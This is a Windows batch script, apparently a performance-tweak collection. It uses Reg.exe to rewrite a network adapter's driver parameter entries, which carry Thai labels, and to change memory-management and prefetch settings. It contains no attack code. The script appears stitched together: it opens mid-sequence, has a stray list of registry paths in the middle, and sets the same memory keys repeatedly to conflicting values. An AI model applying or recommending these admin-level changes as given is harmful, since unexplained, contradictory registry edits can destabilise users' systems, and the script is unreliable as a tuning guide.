Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv4" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv4\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv4\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv6" /v "ParamDesc" /t REG_SZ /d "ส่งออฟโหลดขนาดใหญ่ v2 (IPv6)" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv6" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv6" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv6\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*LsoV2IPv6\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*NumRssQueues" /v "ParamDesc" /t REG_SZ /d "จำนวนสูงสุดของคิว RSS" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*NumRssQueues" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*NumRssQueues" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*NumRssQueues\Enum" /v "1" /t REG_SZ /d "1 คิว" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*NumRssQueues\Enum" /v "2" /t REG_SZ /d "2 คิว" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*NumRssQueues\Enum" /v "4" /t REG_SZ /d "4 คิว" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMARPOffload" /v "ParamDesc" /t REG_SZ /d "ARP ออฟโหลด" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMARPOffload" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMARPOffload" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMARPOffload\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMARPOffload\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMNSOffload" /v "ParamDesc" /t REG_SZ /d "NS ออฟโหลด" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMNSOffload" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMNSOffload" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMNSOffload\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PMNSOffload\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PriorityVLANTag" /v "ParamDesc" /t REG_SZ /d "ลำดับความสำคัญ & VLAN " /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PriorityVLANTag" /v "default" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PriorityVLANTag" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PriorityVLANTag\enum" /v "0" /t REG_SZ /d "ลำดับความสำคัญ & VLAN ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PriorityVLANTag\enum" /v "1" /t REG_SZ /d "ลำดับความสำคัญเปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PriorityVLANTag\enum" /v "2" /t REG_SZ /d "VLAN เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*PriorityVLANTag\enum" /v "3" /t REG_SZ /d "ลำดับความสำคัญ & VLAN เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*ReceiveBuffers" /v "ParamDesc" /t REG_SZ /d "บัฟเฟอร์รับ" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*ReceiveBuffers" /v "Type" /t REG_SZ /d "int" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*ReceiveBuffers" /v "Default" /t REG_SZ /d "512" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*ReceiveBuffers" /v "Min" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*ReceiveBuffers" /v "Max" /t REG_SZ /d "512" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*ReceiveBuffers" /v "Step" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*ReceiveBuffers" /v "Base" /t REG_SZ /d "10" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*RSS" /v "ParamDesc" /t REG_SZ /d "การเปลี่ยนขนาดด้านที่ได้รับ" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*RSS" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*RSS" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*RSS\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*RSS\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex" /v "ParamDesc" /t REG_SZ /d "ความเร็ว & ดูเพล็กซ์" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex" /v "default" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex\enum" /v "0" /t REG_SZ /d "การปรับอัตโนมัติ" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex\enum" /v "1" /t REG_SZ /d "10 Mbps ฮาล์ฟดูเพล็กซ์" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex\enum" /v "2" /t REG_SZ /d "10 Mbps ฟุลดูเพล็กซ์" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex\enum" /v "3" /t REG_SZ /d "100 Mbps ฮาล์ฟดูเพล็กซ์" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*SpeedDuplex\enum" /v "4" /t REG_SZ /d "100 Mbps ฟุลดูเพล็กซ์" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv4" /v "ParamDesc" /t REG_SZ /d "TCP เช็คซัม ออฟโหลด (IPv4)" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv4" /v "default" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv4" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv4\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv4\enum" /v "1" /t REG_SZ /d "Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv4\enum" /v "2" /t REG_SZ /d "Rx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv4\enum" /v "3" /t REG_SZ /d "Rx & Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv6" /v "ParamDesc" /t REG_SZ /d "TCP เช็คซัม ออฟโหลด (IPv6)" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv6" /v "default" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv6" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv6\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv6\enum" /v "1" /t REG_SZ /d "Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv6\enum" /v "2" /t REG_SZ /d "Rx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TCPChecksumOffloadIPv6\enum" /v "3" /t REG_SZ /d "Rx & Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TransmitBuffers" /v "ParamDesc" /t REG_SZ /d "บัฟเฟอร์รับส่ง" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TransmitBuffers" /v "Type" /t REG_SZ /d "int" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TransmitBuffers" /v "Default" /t REG_SZ /d "128" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TransmitBuffers" /v "Min" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TransmitBuffers" /v "Max" /t REG_SZ /d "128" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TransmitBuffers" /v "Step" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*TransmitBuffers" /v "Base" /t REG_SZ /d "10" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv4" /v "ParamDesc" /t REG_SZ /d "UDP เช็คซัม ออฟโหลด (IPv4)" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv4" /v "default" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv4" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv4\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv4\enum" /v "1" /t REG_SZ /d "Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv4\enum" /v "2" /t REG_SZ /d "Rx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv4\enum" /v "3" /t REG_SZ /d "Rx & Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv6" /v "ParamDesc" /t REG_SZ /d "UDP เช็คซัม ออฟโหลด (IPv6)" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv6" /v "default" /t REG_SZ /d "3" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv6" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv6\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv6\enum" /v "1" /t REG_SZ /d "Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv6\enum" /v "2" /t REG_SZ /d "Rx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*UDPChecksumOffloadIPv6\enum" /v "3" /t REG_SZ /d "Rx & Tx เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnMagicPacket" /v "ParamDesc" /t REG_SZ /d "เปิดด้วย Magic Packet" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnMagicPacket" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnMagicPacket" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnMagicPacket\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnMagicPacket\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnPattern" /v "ParamDesc" /t REG_SZ /d "เปิดเมื่อรูปแบบตรงกัน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnPattern" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnPattern" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnPattern\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\*WakeOnPattern\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\EEE" /v "ParamDesc" /t REG_SZ /d "อีเธอร์เน็ตประหยัดพลังงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\EEE" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\EEE" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\EEE\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\EEE\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\NetworkAddress" /v "ParamDesc" /t REG_SZ /d "เน็ตเวิร์กแอดเดรส" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\NetworkAddress" /v "type" /t REG_SZ /d "edit" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\NetworkAddress" /v "default" /t REG_SZ /d "" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\NetworkAddress" /v "LimitText" /t REG_SZ /d "12" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\NetworkAddress" /v "UpperCase" /t REG_SZ /d "1" /f
ping -n 2 127.0.0.1>nul
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\NetworkAddress" /v "Optional" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\S5WakeOnLan" /v "ParamDesc" /t REG_SZ /d "การปลุกแลนหลังปิดเครื่อง" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\S5WakeOnLan" /v "default" /t REG_SZ /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\S5WakeOnLan" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\S5WakeOnLan\enum" /v "0" /t REG_SZ /d "ปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\S5WakeOnLan\enum" /v "1" /t REG_SZ /d "เปิดทำงาน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\WolShutdownLinkSpeed" /v "ParamDesc" /t REG_SZ /d "ความเร็วลิงค์การปลุกแลน & ปิดเครื่อง" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\WolShutdownLinkSpeed" /v "default" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\WolShutdownLinkSpeed" /v "type" /t REG_SZ /d "enum" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\WolShutdownLinkSpeed\enum" /v "0" /t REG_SZ /d "10 Mbps ก่อน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\WolShutdownLinkSpeed\enum" /v "1" /t REG_SZ /d "100 Mbps ก่อน" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0010\Ndi\params\WolShutdownLinkSpeed\enum" /v "2" /t REG_SZ /d "ไม่ลดความเร็ว" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemCacheDirtyPageThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageThreshold" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcTotalDirtyPages" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageTarget" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemCacheDirtyPageThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageThreshold" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcTotalDirtyPages" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageTarget" /t REG_DWORD /d "0" /f
pause
ping -n 2 127.0.0.1>nul
HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\DriverSearching

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Power

HKEY_CURRENT_USER\System\GameConfigStore

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemCacheDirtyPageThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageThreshold" /t REG_DWORD /d "15" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcTotalDirtyPages" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageTarget" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnablePrefetcher" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableSuperfetch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "SystemCacheDirtyPageThreshold" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcDirtyPageThreshold" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CcTotalDirtyPages" /t REG_DWORD /d "0" /f
